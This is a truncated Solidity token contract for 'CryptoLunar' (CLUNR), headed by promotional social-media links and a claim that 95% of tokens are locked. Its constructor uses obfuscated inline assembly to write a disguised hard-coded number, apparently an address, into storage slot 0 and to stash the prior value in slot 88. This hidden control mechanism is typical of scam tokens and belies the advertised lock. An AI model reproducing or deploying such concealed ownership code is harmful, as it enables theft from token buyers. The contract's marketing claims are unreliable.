...
/*
Welcome to CryptoLunar Crypto WORLD!

Telegram: https://t.me/CryptoLunar/
Twitter: https://twitter.com/CryptoLunar/
Website: https://CryptoLunar.crypto
95% of tokens - LOCKED!
...
contract CryptoLunar {
    string public constant name = "CryptoLunar";
    string public constant symbol = "CLUNR";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(1372048958410468203907204637321486028185882086059, 1))}
